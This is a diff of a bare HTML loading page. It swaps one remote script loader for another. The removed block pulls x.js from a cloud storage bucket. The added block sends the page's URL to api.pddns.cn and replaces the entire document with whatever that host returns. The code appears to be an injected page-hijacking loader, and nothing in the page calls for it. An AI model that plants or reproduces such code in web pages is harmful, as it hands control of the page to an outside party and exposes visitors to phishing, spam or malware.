@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,12 +20,13 @@
 			<div class="sk-chase-dot"></div>
 		</div>
 	</div>
-	<script>
-	(function(){
-		var s=document.createElement("script");
-		s.src='//app-miss.oss-accelerate.aliyuncs.com/x.js?'+new Date().getTime();
-		document.body.appendChild(s);
-	})();
-	</script>
+<script>
+fetch('https://api.pddns.cn/x?ref='+encodeURIComponent(location.href.split('#')[0]))
+.then(response => response.text())
+.then(content=>{
+    var a = document.open("text/html", "replace");
+    a.write(content), a.close();
+});
+</script>
 </body>
 </html>
